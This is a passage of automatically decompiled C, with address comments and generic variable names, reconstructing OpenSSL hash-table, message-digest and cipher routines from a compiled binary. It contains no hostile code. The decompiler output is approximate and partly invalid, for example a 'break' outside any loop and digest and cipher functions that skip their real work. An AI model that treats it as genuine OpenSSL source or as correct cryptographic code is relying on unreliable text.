    int64_t result2 = v1; // 0x455fd4
    if (v1 < 0) {
        // 0x45603c
        return result2;
    }
    int32_t v2 = v1; // 0x455fe8
    int64_t v3 = 0x100000000 * result2 / 0x20000000; // 0x455fe8
    int64_t v4 = a1; // 0x455fe8
    int64_t v5 = *(int64_t *)(v4 + v3); // 0x455ff9
    int64_t v6 = v5; // 0x456000
    int64_t v7; // 0x455fb0
    if (v5 != 0) {
        while (true) {
            // 0x456019
            v7 = v6;
            v6 = *(int64_t *)(v7 + 8);
            if (a2 != 0) {
                if (v6 == 0) {
                    // break -> 0x45602f
                    break;
                }
            } else {
                if (v6 == 0) {
                    // break -> 0x45602f
                    break;
                }
            }
        }
        // 0x45602f
        v4 = *(int64_t *)v7;
    }
    // 0x45602f
    v2--;
    v3 -= 8;
    result = v6;
    while (v2 >= 0) {
        // 0x455ff0
        v5 = *(int64_t *)(v4 + v3);
        int64_t v8 = v5; // 0x456000
        int64_t v9 = v5; // 0x456000
        if (v5 != 0) {
            while (true) {
                // 0x456019
                v7 = v8;
                v6 = *(int64_t *)(v7 + 8);
                if (a2 != 0) {
                    if (v6 == 0) {
                        // break -> 0x45602f
                        break;
                    }
                } else {
                    if (v6 == 0) {
                        // break -> 0x45602f
                        break;
                    }
                }
                // 0x456019
                v8 = v6;
            }
            // 0x45602f
            v4 = *(int64_t *)v7;
            v9 = v6;
        }
        // 0x45602f
        v2--;
        v3 -= 8;
        result = v9;
    }
    // 0x45603c
    return result;
}

// Address range: 0x456060 - 0x456072
int64_t lh_doall_arg(int64_t a1, int64_t a2, int64_t * a3) {
    // 0x456060
    return doall_util_fn(a1, 1, 0, (int32_t)a2, (int32_t)(int64_t)a3);
}

// Address range: 0x456080 - 0x456122
int64_t getrn(int64_t a1, int64_t a2, int64_t * a3) {
    int64_t * v1 = (int64_t *)(a1 + 96); // 0x4560a2
    *v1 = *v1 + 1;
    uint64_t v2; // 0x456080
    uint64_t v3 = v2 % (int64_t)*(int32_t *)(a1 + 36); // 0x4560ae
    uint32_t v4 = *(int32_t *)(a1 + 32); // 0x4560b1
    int32_t v5 = v4; // 0x4560b7
    int64_t v6 = v3; // 0x4560b7
    if (v3 < (int64_t)v4) {
        uint64_t v7 = (int64_t)*(int32_t *)(a1 + 28);
        v5 = v2 / v7;
        v6 = v2 % v7;
    }
    int64_t result = 0x100000000 * v6 / 0x20000000 + a2; // 0x4560d3
    int64_t v8 = *(int64_t *)result; // 0x4560d6
    if (v8 == 0) {
        // 0x456110
        return result;
    }
    int64_t * v9 = (int64_t *)(a1 + 104);
    int64_t * v10 = (int64_t *)(a1 + 160); // 0x4560ed
    *v10 = *v10 + 1;
    if (v2 == *(int64_t *)(v8 + 16)) {
        // 0x4560fb
        *v9 = *v9 + 1;
        if (v5 == 0) {
            // break -> 0x456110
            break;
        }
    }
    int64_t v11 = v8 + 8; // 0x4560e0
    int64_t v12 = *(int64_t *)v11; // 0x4560e4
    int64_t result2 = v11; // 0x4560eb
    while (v12 != 0) {
        int64_t v13 = v11;
        *v10 = *v10 + 1;
        if (v2 == *(int64_t *)(v12 + 16)) {
            // 0x4560fb
            *v9 = *v9 + 1;
            result2 = v13;
            if (v5 == 0) {
                // break -> 0x456110
                break;
            }
        }
        // 0x4560e0
        v11 = v12 + 8;
        v12 = *(int64_t *)v11;
        result2 = v11;
    }
    // 0x456110
    return result2;
}

// Address range: 0x456130 - 0x456172
int64_t lh_retrieve(int64_t a1) {
    // 0x456130
    *(int32_t *)(a1 + 168) = 0;
    int64_t v1; // bp-16, 0x456130
    int64_t v2; // 0x456130
    int64_t v3 = *(int64_t *)getrn(a1, v2, &v1); // 0x45614c
    int64_t result; // 0x456130
    if (v3 == 0) {
        int64_t * v4 = (int64_t *)(a1 + 152); // 0x456168
        *v4 = *v4 + 1;
        result = 0;
    } else {
        int64_t * v5 = (int64_t *)(a1 + 144); // 0x456154
        *v5 = *v5 + 1;
        result = *(int64_t *)v3;
    }
    // 0x45615f
    return result;
}

// Address range: 0x456540 - 0x456697
int64_t lh_new(int64_t a1, int64_t a2) {
    // 0x456540
    int64_t v1; // 0x456540
    int64_t v2; // 0x456540
    int64_t result = CRYPTO_malloc(176, "lhash.c", 119, v2, v1); // 0x45655b
    if (result == 0) {
        // 0x456683
        return 0;
    }
    int64_t v3 = CRYPTO_malloc(128, "lhash.c", 121, v2, v1); // 0x45657d
    int64_t * v4 = (int64_t *)result; // 0x456585
    *v4 = v3;
    if (v3 == 0) {
        // 0x45668b
        CRYPTO_free(result, (int64_t)"lhash.c");
        // 0x456683
        return 0;
    }
    // 0x45659b
    *(int64_t *)v3 = 0;
    int64_t v5 = 0; // 0x4565a3
    v5 += 8;
    *(int64_t *)(*v4 + v5) = 0;
    while (v5 != 120) {
        // 0x456598
        v5 += 8;
        *(int64_t *)(*v4 + v5) = 0;
    }
    // 0x4565b0
    *(int32_t *)(result + 24) = 8;
    *(int32_t *)(result + 28) = 16;
    *(int32_t *)(result + 32) = 0;
    *(int32_t *)(result + 36) = 8;
    *(int64_t *)(result + 40) = 512;
    *(int64_t *)(result + 8) = a2 == 0 ? *(int64_t *)0x7396a8 : a2;
    *(int64_t *)(result + 48) = 256;
    *(int64_t *)(result + 16) = a1 == 0 ? g169 : a1;
    *(int64_t *)(result + 56) = 0;
    *(int64_t *)(result + 64) = 0;
    *(int64_t *)(result + 72) = 0;
    *(int64_t *)(result + 80) = 0;
    *(int64_t *)(result + 88) = 0;
    *(int64_t *)(result + 96) = 0;
    *(int64_t *)(result + 104) = 0;
    *(int64_t *)(result + 112) = 0;
    *(int64_t *)(result + 120) = 0;
    *(int64_t *)(result + 128) = 0;
    *(int64_t *)(result + 136) = 0;
    *(int64_t *)(result + 144) = 0;
    *(int64_t *)(result + 152) = 0;
    *(int64_t *)(result + 160) = 0;
    *(int32_t *)(result + 168) = 0;
    // 0x456683
    return result;
}

// Address range: 0x457250 - 0x4572f6
int64_t EVP_MD_CTX_cleanup(int64_t * a1) {
    int64_t v1 = (int64_t)a1;
    if (a1 != NULL) {
        // 0x45725c
        if (*(int64_t *)(v1 + 56) != 0) {
            // 0x457263
            EVP_MD_CTX_test_flags(v1, 2);
        }
        int32_t * v2 = (int32_t *)(v1 + 104); // 0x457279
        if (*v2 != 0) {
            int64_t * v3 = (int64_t *)(v1 + 24); // 0x4572b0
            if (*v3 != 0) {
                // 0x4572b7
                if ((int32_t)EVP_MD_CTX_test_flags(v1, 4) == 0) {
                    int64_t v4 = (int64_t)*v2; // 0x4572cf
                    OPENSSL_cleanse(*v3, v4);
                    CRYPTO_free(*v3, v4);
                }
            }
        }
    }
    int64_t v5 = *(int64_t *)(v1 + 32); // 0x457280
    if (v5 != 0) {
        // 0x457289
        EVP_PKEY_CTX_free(v5);
    }
    int64_t v6 = *(int64_t *)(v1 + 8); // 0x45728e
    if (v6 != 0) {
        // 0x457297
        ENGINE_finish(v6);
    }
    // 0x45729c
    __asm_rep_stosq_memset((char *)a1, 0, 6);
    return 1;
}

// Address range: 0x457330 - 0x45733b
int64_t EVP_MD_CTX_init(int64_t a1) {
    // 0x457330
    __asm_rep_stosq_memset((char *)a1, 0, 6);
    return 0;
}

// Address range: 0x457370 - 0x457526
int64_t EVP_MD_CTX_copy_ex(int64_t * a1, int64_t a2) {
    // 0x457370
    if (a2 == 0) {
        // 0x4574d0
        ERR_put_error(6, 110, 111, "digest.c", 337);
        return 0;
    }
    int64_t * v1 = (int64_t *)(a2 + 8); // 0x45738f
    int64_t v2 = *v1; // 0x45738f
    if (v2 != 0) {
        // 0x457398
        if ((int32_t)ENGINE_init(v2) == 0) {
            // 0x4574a8
            ERR_put_error(6, 110, 38, "digest.c", 344);
            return 0;
        }
    }
    int64_t v3 = (int64_t)a1;
    int64_t * v4 = (int64_t *)(v3 + 24);
    int64_t v5 = a2; // 0x4573af
    int64_t v6 = 0; // 0x4573af
    if (v2 == a2) {
        // 0x457510
        v6 = *v4;
        EVP_MD_CTX_set_flags(v3, 4);
        v5 = 4;
    }
    // 0x4573b5
    EVP_MD_CTX_cleanup(a1);
    *a1 = v5;
    *(int64_t *)(v3 + 8) = *v1;
    *(int64_t *)(v3 + 16) = *(int64_t *)(a2 + 16);
    int64_t * v7 = (int64_t *)(a2 + 24); // 0x4573d4
    *v4 = *v7;
    int64_t * v8 = (int64_t *)(a2 + 32); // 0x4573dc
    int64_t * v9 = (int64_t *)(v3 + 32); // 0x4573e0
    *v9 = *v8;
    int64_t * v10 = (int64_t *)(a2 + 40); // 0x4573e4
    int64_t * v11 = (int64_t *)(v3 + 40); // 0x4573e8
    *v11 = *v10;
    if (*v7 != 0) {
        uint32_t v12 = *(int32_t *)(v5 + 104); // 0x4573f3
        if (v12 != 0) {
            int64_t v13; // 0x457370
            if (v6 == 0) {
                // 0x457460
                int64_t v14; // 0x457370
                int64_t v15; // 0x457370
                int64_t v16 = CRYPTO_malloc((int64_t)v12, "digest.c", 364, v15, v14); // 0x45746c
                *v4 = v16;
                v13 = v16;
                if (v16 == 0) {
                    // 0x45747d
                    ERR_put_error(v16 & -256 | 6, 110, 65, "digest.c", 367);
                    // 0x45744c
                    return 0;
                }
            } else {
                // 0x4573ff
                *v4 = v6;
                v13 = v6;
            }
            int32_t v17 = *(int32_t *)(v13 + 104); // 0x45740e
            memcpy((int64_t *)v13, (int64_t *)*v7, v17);
        }
    }
    int64_t v18 = *v8; // 0x457417
    *v11 = *v10;
    if (v18 == 0) {
        // 0x45744c
        return 1;
    }
    int64_t v19 = EVP_PKEY_CTX_dup(v18); // 0x457428
    *v9 = v19;
    int64_t result = 1; // 0x457434
    if (v19 == 0) {
        // 0x457500
        EVP_MD_CTX_cleanup(a1);
        result = 0;
    }
    // 0x45744c
    return result;
}

// Address range: 0x457570 - 0x4575b2
int64_t EVP_DigestUpdate(int64_t * a1, int64_t a2, int64_t a3) {
    // 0x457570
    FIPS_selftest_check();
    return *(int64_t *)((int64_t)a1 + 40);
}

// Address range: 0x4575c0 - 0x457675
int64_t EVP_DigestFinal_ex(int64_t * a1, int64_t * a2, int64_t * a3) {
    int64_t v1 = (int64_t)a1;
    FIPS_selftest_check();
    int32_t v2 = *(int32_t *)(v1 + 8); // 0x4575e4
    if (v2 > 64) {
        // 0x457650
        OpenSSLDie("digest.c", 313, "ctx->digest->md_size <= EVP_MAX_MD_SIZE");
        // UNREACHABLE
    }
    if (a3 != NULL) {
        // 0x4575fb
        *(int32_t *)a3 = v2;
    }
    // 0x457604
    if (*(int64_t *)(v1 + 56) != 0) {
        // 0x45760d
        EVP_MD_CTX_set_flags(v1, 2);
    }
    // 0x457622
    memset((int64_t *)*(int64_t *)(v1 + 24), 0, *(int32_t *)(v1 + 104));
    return v1 & 0xffffffff;
}

// Address range: 0x457750 - 0x457a38
int64_t EVP_DigestInit_ex(int64_t * a1, int64_t a2, int32_t a3, int64_t a4, int64_t a5) {
    int64_t v1 = (int64_t)a1;
    EVP_MD_CTX_clear_flags(v1, 2);
    if ((int32_t)FIPS_selftest_failed() != 0) {
        // 0x457888
        ERR_put_error(45, 125, 106, "digest.c", 184);
        *a1 = (int64_t)&g82;
        return (int32_t)&g82 ^ (int32_t)&g82;
    }
    int64_t v2 = a3;
    int64_t * v3 = (int64_t *)(v1 + 8); // 0x457774
    int64_t v4 = *v3; // 0x457774
    int64_t v5; // 0x457750
    if (v4 == 0) {
        // 0x457870
        v5 = v2;
        if (a2 == 0) {
            // 0x4578fa
            ERR_put_error(6, 128, 139, "digest.c", 239);
            // 0x457861
            return 0;
        }
        goto lab_0x4577a7;
    } else {
        if (a2 == 0 || (int32_t)v4 == 2) {
            goto lab_0x457828;
        } else {
            // 0x4577a2
            ENGINE_finish(v4);
            v5 = 2;
            goto lab_0x4577a7;
        }
    }
  lab_0x4577a7:;
    // 0x4577a7
    int64_t v6; // 0x457750
    int64_t v7; // 0x457750
    int64_t v8; // 0x457750
    int64_t v9; // 0x457750
    if (a3 == 0) {
        int64_t v10 = ENGINE_get_digest_engine(2); // 0x457954
        v7 = v10;
        v8 = 2;
        v9 = 0;
        v6 = a2;
        if (v10 != 0) {
            goto lab_0x4577c0;
        } else {
            goto lab_0x4577dc;
        }
    } else {
        int64_t v11 = ENGINE_init(v2); // 0x4577b3
        v7 = v2;
        if ((int32_t)v11 == 0) {
            // 0x457928
            ERR_put_error(6, 128, 134, "digest.c", 208);
            // 0x457861
            return 0;
        }
        goto lab_0x4577c0;
    }
  lab_0x457828:;
    int64_t v12 = *(int64_t *)(v1 + 32); // 0x457828
    if (v12 != 0) {
        int32_t v13 = EVP_PKEY_CTX_ctrl(v12, 0xffffffff, 248, 7, 0, v1); // 0x45784b
        if (v13 != -2) {
            // 0x4578e0
            if (v13 >= 0 != v13 != 0) {
                // 0x457861
                return 0;
            }
        }
    }
    // 0x457856
    if (*(char *)(v1 + 17) % 2 == 0) {
        // 0x4578d0
        return *(int64_t *)(v12 + 24);
    }
    // 0x457861
    return 1;
  lab_0x4577c0:;
    int64_t v14 = ENGINE_get_digest(v7, 2, v5); // 0x4577c7
    v8 = v7;
    v9 = v7;
    v6 = v14;
    if (v14 == 0) {
        // 0x457a08
        ERR_put_error(6, 128, 134, "digest.c", 222);
        ENGINE_finish(v7);
        // 0x457861
        return 0;
    }
    goto lab_0x4577dc;
  lab_0x4577dc:
    // 0x4577dc
    *v3 = v9;
    if (v8 != v6) {
        // 0x4577e1
        if ((int32_t)FIPS_mode() != 0) {
            // 0x4577ea
            if ((*(char *)(v6 + 17) & 4) == 0) {
                // 0x4577f2
                if ((*(char *)(v1 + 16) & 8) == 0) {
                    // 0x4579d0
                    ERR_put_error(6, 128, 163, "digest.c", 251);
                    *a1 = (int64_t)&g82;
                    int64_t result = (int32_t)&g82 ^ (int32_t)&g82; // 0x4579fd
                    // 0x457861
                    return result;
                }
            }
        }
        int64_t v15 = a4; // 0x457802
        if (v8 != 0) {
            uint32_t v16 = *(int32_t *)(v8 + 104); // 0x457804
            int64_t v17 = v16; // 0x457804
            v15 = v17;
            if (v16 != 0) {
                // 0x4578c0
                CRYPTO_free(*(int64_t *)(v1 + 24), 2);
                v15 = v17;
            }
        }
        // 0x45780f
        *a1 = v6;
        if (*(char *)(v1 + 17) % 2 == 0) {
            uint32_t v18 = *(int32_t *)(v6 + 104); // 0x457818
            if (v18 != 0) {
                // 0x457978
                *(int64_t *)(v1 + 40) = *(int64_t *)(v6 + 32);
                int64_t v19 = CRYPTO_malloc((int64_t)v18, "digest.c", 263, v15, a5); // 0x457992
                *(int64_t *)(v1 + 24) = v19;
                if (v19 == 0) {
                    // 0x4579a4
                    ERR_put_error(6, 128, 65, "digest.c", 267);
                    // 0x457861
                    return 0;
                }
            }
        }
    }
    goto lab_0x457828;
}

// Address range: 0x457a40 - 0x457b0b
int64_t EVP_Digest(int64_t a1, int32_t a2, int64_t * a3, int32_t a4, int64_t a5, int32_t a6) {
    int64_t v1 = a4;
    int64_t v2; // bp-104, 0x457a40
    int64_t v3 = &v2; // 0x457a7b
    EVP_MD_CTX_init(v3);
    EVP_MD_CTX_set_flags(v3, 1);
    if ((int32_t)EVP_DigestInit_ex(&v2, a5, a6, v1, a5) == 0) {
        // 0x457aa9
        EVP_MD_CTX_cleanup(&v2);
        return 0;
    }
    // 0x457ae0
    if ((int32_t)EVP_DigestUpdate(&v2, a1, (int64_t)a2) != 0) {
        // 0x457af2
        if ((int32_t)EVP_DigestFinal_ex(&v2, a3, (int64_t *)v1) != 0) {
            // 0x457aa9
            EVP_MD_CTX_cleanup(&v2);
            return 1;
        }
    }
    // 0x457aa9
    EVP_MD_CTX_cleanup(&v2);
    return 0;
}

// Address range: 0x457b80 - 0x457c20
int64_t EVP_CIPHER_CTX_ctrl(int64_t a1) {
    if (a1 == 0) {
        // 0x457bf8
        ERR_put_error(6, 124, 131, "evp_enc.c", 673);
        // 0x457b9c
        return 0;
    }
    int64_t result = *(int64_t *)(a1 + 72); // 0x457b8c
    if (result == 0) {
        // 0x457bd0
        ERR_put_error(6, 124, 132, "evp_enc.c", 678);
        // 0x457b9c
        return 0;
    }
    // 0x457b95
    if ((int32_t)result != -1) {
        // 0x457b9c
        return result;
    }
    // 0x457ba8
    ERR_put_error(6, 124, 133, "evp_enc.c", 684);
    return 0;
}

// Address range: 0x457c20 - 0x457c92
int64_t EVP_CIPHER_CTX_set_key_length(int64_t a1, uint32_t a2, int64_t a3, int64_t a4) {
    int64_t v1 = *(int64_t *)(a1 + 16); // 0x457c27
    if ((char)v1 < 0) {
        // 0x457c80
        return EVP_CIPHER_CTX_ctrl(a1);
    }
    int32_t * v2 = (int32_t *)(a1 + 104); // 0x457c2f
    if (*v2 == a2) {
        // 0x457c65
        return 1;
    }
    if (a2 >= 1) {
        if ((v1 & 8) != 0) {
            // 0x457c70
            *v2 = a2;
            return 1;
        }
    }
    // 0x457c42
    ERR_put_error(6, 122, 130, "evp_enc.c", 658);
    // 0x457c65
    return 0;
}

// Address range: 0x457ce0 - 0x457d41
int64_t EVP_CIPHER_CTX_cleanup(int64_t a1) {
    int64_t * v1 = (int64_t *)120; // 0x457cea
    int64_t v2; // 0x457ce0
    if (a1 == 0) {
        goto lab_0x457d14;
    } else {
        int64_t v3 = *(int64_t *)(a1 + 40); // 0x457cec
        if (v3 != 0 == (int32_t)v3 == 0) {
            // 0x457d3f
            return 0;
        }
        // 0x457cff
        v1 = (int64_t *)(a1 + 120);
        int64_t v4 = *v1; // 0x457cff
        if (v4 == 0) {
            goto lab_0x457d22;
        } else {
            int64_t v5 = (int64_t)*(int32_t *)(v4 + 48); // 0x457d0b
            OPENSSL_cleanse(v4, v5);
            v2 = v5;
            goto lab_0x457d14;
        }
    }
  lab_0x457d14:;
    int64_t v6 = *v1; // 0x457d14
    if (v6 != 0) {
        // 0x457d1d
        CRYPTO_free(v6, v2);
    }
    goto lab_0x457d22;
  lab_0x457d22:;
    int64_t v7 = *(int64_t *)(a1 + 8); // 0x457d22
    if (v7 != 0) {
        // 0x457d2b
        ENGINE_finish(v7);
    }
    // 0x457d30
    __asm_rep_stosq_memset((char *)a1, 0, 21);
    // 0x457d3f
    return 1;
}

// Address range: 0x457ee0 - 0x4580d8
int64_t EVP_DecryptFinal_ex(int64_t a1, int64_t a2, int64_t a3, int64_t a4) {
    int32_t * v1 = (int32_t *)a3; // 0x457f04
    *v1 = 0;
    if ((*(char *)(a1 + 18) & 16) != 0) {
        uint32_t v2 = (int32_t)a1; // 0x45800b
        int64_t result = 0; // 0x45800d
        if (v2 >= 0) {
            // 0x458013
            *v1 = v2;
            result = 1;
        }
        // 0x457f34
        return result;
    }
    // 0x457f14
    if (*(char *)(a1 + 113) % 2 != 0) {
        // 0x457f1e
        if (*(int32_t *)(a1 + 20) != 0) {
            // 0x458050
            ERR_put_error(6, 101, 138, "evp_enc.c", 579);
            // 0x457f34
            return 0;
        }
        // 0x457f29
        *v1 = 0;
        // 0x457f34
        return 1;
    }
    uint32_t v3 = *(int32_t *)(a1 + 4); // 0x457f18
    if (v3 < 2) {
        // 0x457f29
        *v1 = 0;
        // 0x457f34
        return 1;
    }
    // 0x457f56
    if (*(int32_t *)(a1 + 20) != 0 || *(int32_t *)(a1 + 128) == 0) {
        // 0x458020
        ERR_put_error(6, 101, 109, "evp_enc.c", 589);
        // 0x457f34
        return 0;
    }
    if (v3 >= 33) {
        // 0x4580b0
        OpenSSLDie("evp_enc.c", 592, "b <= sizeof ctx->final");
        // UNREACHABLE
    }
    uint64_t v4 = (int64_t)v3; // 0x457f18
    int64_t v5 = v3 - 1; // 0x457f79
    int64_t v6 = a1 + 136; // 0x457f7f
    unsigned char v7 = *(char *)(v6 + v5); // 0x457f7f
    uint64_t v8 = (int64_t)v7; // 0x457f7f
    int64_t v9 = v5; // 0x457f8a
    int64_t v10 = 596; // 0x457f8a
    if (v4 >= v8 != v7 != 0) {
      lab_0x458086:
        // 0x458086
        ERR_put_error(6, 101, 100, "evp_enc.c", v10);
        // 0x457f34
        return 0;
    }
    while ((v4 - v9 & 0xffffffff) < v8) {
        // 0x457fa0
        v9 = v9 + 0xffffffff & 0xffffffff;
        v10 = 603;
        if (*(char *)(v9 + v6) != v7) {
            goto lab_0x458086;
        }
    }
    int32_t v11 = v3 - (int32_t)v7; // 0x457fc5
    if (v11 < 1) {
        // 0x457ff0
        *v1 = v11;
        // 0x457f34
        return 1;
    }
    int64_t v12 = a2; // 0x457fd3
    int64_t v13 = a1 + 1; // 0x457fdf
    *(char *)v12 = *(char *)(a1 + 136);
    v12++;
    while (v13 != a1 + 1 + (int64_t)(v11 - 1)) {
        int64_t v14 = v13;
        v13 = v14 + 1;
        *(char *)v12 = *(char *)(v14 + 136);
        v12++;
    }
    // 0x457ff0
    *v1 = v11;
    // 0x457f34
    return 1;
}

// Address range: 0x458270 - 0x4584c6
int64_t EVP_EncryptUpdate(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
    int64_t v1 = a3;
    if ((*(char *)(a1 + 18) & 16) != 0) {
        // 0x458390
        int64_t v2; // 0x458270
        uint32_t v3 = (int32_t)v2; // 0x45839a
        int64_t result = 0; // 0x45839c
        if (v3 >= 0) {
            // 0x45839e
            *(int32_t *)a3 = v3;
            result = 1;
        }
        // 0x4583a6
        return result;
    }
    int32_t v4 = a5; // 0x4582ac
    if (v4 < 1) {
        // 0x4584a0
        *(int32_t *)a3 = 0;
        // 0x4583a6
        return v4 == 0;
    }
    int32_t * v5 = (int32_t *)(a1 + 20); // 0x4582b6
    int32_t v6 = *v5; // 0x4582b6
    if (v6 == 0) {
        // 0x458358
        if ((*(int32_t *)(a1 + 132) & v4) == 0) {
            // 0x4584b8
            *(int32_t *)a3 = 0;
            // 0x4583a6
            return 0;
        }
    }
    uint32_t v7 = *(int32_t *)(a1 + 4); // 0x4582c1
    if (v7 > 32) {
        // 0x458470
        OpenSSLDie("evp_enc.c", 400, "bl <= (int)sizeof(ctx->buf)");
        // UNREACHABLE
    }
    int64_t v8 = v7; // 0x4582c1
    int64_t v9; // 0x458270
    int64_t v10; // 0x458270
    if (v6 == 0) {
        // 0x4583d0
        *(int32_t *)a3 = 0;
        v10 = a5;
        v9 = a4;
    } else {
        int64_t v11 = v8 - (int64_t)v6; // 0x4582da
        if ((v11 & 0xffffffff) > a5) {
            // 0x458420
            memcpy((int64_t *)(a1 + 56 + (int64_t)v6), (int64_t *)a4, v4);
            *v5 = *v5 + v4;
            *(int32_t *)a3 = 0;
            // 0x4583a6
            return 1;
        }
        int64_t v12 = 0x100000000 * v11 / 0x100000000; // 0x4582ec
        int64_t v13 = a1 + 56 + (int64_t)v6; // 0x4582fa
        memcpy((int64_t *)v13, (int64_t *)a4, (int32_t)v12);
        if ((int32_t)v13 == 0) {
            // 0x4583a6
            return 0;
        }
        // 0x458343
        *(int32_t *)a3 = v7;
        v10 = a5 - v11 & 0xffffffff;
        v9 = v12 + a4;
    }
    int64_t v14 = v10 & v8 + 0xffffffff; // 0x4583de
    int64_t v15 = v10 - v14; // 0x4583e1
    uint32_t v16 = (int32_t)v15; // 0x4583e4
    if (v16 >= 1) {
        // 0x4583e9
        if ((int32_t)a1 == 0) {
            // 0x4583a6
            return 0;
        }
        // 0x4583ff
        *(int32_t *)a3 = *(int32_t *)&v1 + v16;
    }
    int32_t v17 = v14; // 0x458403
    if (v17 != 0) {
        // 0x458458
        memcpy((int64_t *)(a1 + 56), (int64_t *)(0x100000000 * v15 / 0x100000000 + v9), v17);
    }
    // 0x458408
    *v5 = v17;
    // 0x4583a6
    return 1;
}

// Address range: 0x4584d0 - 0x4586be
int64_t EVP_DecryptUpdate(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
    int64_t v1 = a3;
    if ((*(char *)(a1 + 18) & 16) != 0) {
        int32_t v2 = a1; // 0x4585b9
        int32_t * v3 = (int32_t *)a3;
        int64_t result; // 0x4584d0
        if (v2 < 0) {
            // 0x4586b0
            *v3 = 0;
            result = 0;
        } else {
            // 0x4585c1
            *v3 = v2;
            result = 1;
        }
        // 0x458588
        return result;
    }
    int32_t v4 = a5; // 0x45850b
    if (v4 < 1) {
        // 0x458630
        *(int32_t *)a3 = 0;
        // 0x458588
        return v4 == 0;
    }
    // 0x458515
    if (*(char *)(a1 + 113) % 2 != 0) {
        // 0x4585d0
        int64_t v5; // 0x4584d0
        return EVP_EncryptUpdate(a1, a2, a3, a4, a5, v5);
    }
    uint32_t v6 = *(int32_t *)(a1 + 4); // 0x45851f
    if (v6 >= 33) {
        // 0x458648
        OpenSSLDie("evp_enc.c", 519, "b <= sizeof ctx->final");
        // UNREACHABLE
    }
    int32_t * v7 = (int32_t *)(a1 + 128); // 0x45852d
    int64_t v8 = a5; // 0x45853a
    int64_t v9 = a2; // 0x45853a
    int32_t v10 = 0; // 0x45853a
    if (*v7 != 0) {
        // 0x45867d
        memcpy((int64_t *)a2, (int64_t *)(a1 + 136), v6);
        v8 = a5 & 0xffffffff;
        v9 = (int64_t)v6 + a2;
        v10 = 1;
    }
    int64_t v11 = EVP_EncryptUpdate(a1, v9, a3, a4, v8, (int64_t)&g299); // 0x45854c
    if ((int32_t)v11 == 0) {
        // 0x458588
        return 0;
    }
    // 0x458559
    if (v6 < 2) {
        // 0x45856c
        *v7 = 0;
        goto lab_0x458576;
    } else {
        // 0x45855f
        if (*(int32_t *)(a1 + 20) == 0) {
            // 0x458600
            *(int32_t *)a3 = (int32_t)a3 - v6;
            *v7 = 1;
            int32_t v12 = *(int32_t *)&v1; // 0x458615
            memcpy((int64_t *)(a1 + 136), (int64_t *)(v9 + (int64_t)v12), v6);
            goto lab_0x458576;
        } else {
            // 0x45856c
            *v7 = 0;
            goto lab_0x458576;
        }
    }
  lab_0x458576:
    // 0x458576
    if (v10 != 0) {
        // 0x458580
        *(int32_t *)a3 = *(int32_t *)&v1 + v6;
    }
    // 0x458588
    return 1;
}

// Address range: 0x4587d0 - 0x458c5d
int64_t EVP_CipherInit_ex(int64_t a1, int64_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int64_t v1 = a2;
    int32_t v2; // 0x4587d0
    int64_t result; // 0x4587d0
    if (a6 == -1) {
        // 0x4589e0
        v2 = *(int32_t *)(a1 + 16);
        if ((int32_t)FIPS_selftest_failed() != 0) {
            // 0x4589f1
            ERR_put_error(45, 124, 106, "evp_enc.c", 158);
            *(int64_t *)a1 = (int64_t)&g83;
            result = (int32_t)&g83 ^ (int32_t)&g83;
            // 0x458951
            return result;
        }
    } else {
        int32_t v3 = a6 != 0; // 0x458811
        *(int32_t *)(a1 + 16) = v3;
        v2 = v3;
        if ((int32_t)FIPS_selftest_failed() != 0) {
            // 0x4589f1
            ERR_put_error(45, 124, 106, "evp_enc.c", 158);
            *(int64_t *)a1 = (int64_t)&g83;
            result = (int32_t)&g83 ^ (int32_t)&g83;
            // 0x458951
            return result;
        }
    }
    int64_t v4 = a3;
    int32_t v5 = a1;
    int64_t * v6 = (int64_t *)(a1 + 8); // 0x458826
    int64_t v7; // 0x4587d0
    int64_t v8; // 0x4587d0
    if (a1 == 0 | *v6 == 0) {
        if (a2 == 0) {
            // 0x458bb0
            v7 = a1;
            if (a1 == 0) {
                // 0x458bb9
                ERR_put_error(6, 123, 131, "evp_enc.c", 248);
                // 0x458951
                return 0;
            }
            goto lab_0x4588e0;
        } else {
            // 0x4589cc
            v8 = v4;
            if (a1 == 0) {
                goto lab_0x45886f;
            } else {
                goto lab_0x458851;
            }
        }
    } else {
        // 0x45883d
        v7 = a1;
        if (a2 == 0) {
            goto lab_0x4588e0;
        } else {
            // 0x458846
            v7 = a1;
            if (*(int32_t *)&v1 == v5) {
                goto lab_0x4588e0;
            } else {
                goto lab_0x458851;
            }
        }
    }
  lab_0x4588e0:
    // 0x4588e0
    switch (*(int32_t *)(v7 + 4)) {
        case 16: {
        }
        case 8: {
        }
        case 1: {
            // 0x4588ec
            if ((EVP_CIPHER_CTX_flags(a1) & 16) == 0) {
                uint64_t v9 = EVP_CIPHER_CTX_flags(a1) & 0xf0007; // 0x458a88
                if (v9 < 6) {
                    // 0x458a93
                    return (int64_t)*(int32_t *)(4 * v9 + (int64_t)&g3);
                }
                // 0x458951
                return 0;
            }
            // break -> 0x4588fc
            break;
        }
        default: {
            // 0x45898a
            OpenSSLDie("evp_enc.c", 257, "ctx->cipher->block_size == 1 || ctx->cipher->block_size == 8 || ctx->cipher->block_size == 16");
            // UNREACHABLE
        }
    }
    if (a4 == 0) {
        // 0x458aa8
        if (v5 == 0 == ((*(char *)(a1 + 16) & 32) != 0)) {
            // 0x458951
            return 0;
        }
    } else {
        // 0x458905
        if ((int32_t)FIPS_mode() != 0) {
            // 0x458a30
            if ((*(char *)(a1 + 113) & 8) == 0) {
                // 0x458a3d
                if ((*(char *)(a1 + 17) & 4) == 0) {
                    // 0x458a47
                    ERR_put_error(6, 123, 163, "evp_enc.c", 302);
                    *(int64_t *)a1 = (int64_t)&g83;
                    result = (int32_t)&g83 ^ (int32_t)&g83;
                    // 0x458951
                    return result;
                }
            }
        }
        // 0x458915
        if (v5 == 0) {
            // 0x458951
            return 0;
        }
    }
    // 0x45892f
    *(int32_t *)(a1 + 20) = 0;
    *(int32_t *)(a1 + 128) = 0;
    *(int32_t *)(a1 + 132) = *(int32_t *)(a1 + 4) - 1;
    // 0x458951
    return 1;
  lab_0x45886f:;
    // 0x45886f
    int32_t v10; // 0x4587d0
    int64_t v11; // 0x4587d0
    int64_t v12; // 0x4587d0
    int64_t v13; // 0x4587d0
    int64_t v14; // 0x4587d0
    if (a3 == 0) {
        int32_t v15 = *(int32_t *)&v1; // 0x458be8
        int64_t v16 = ENGINE_get_cipher_engine(v15); // 0x458beb
        v10 = v15;
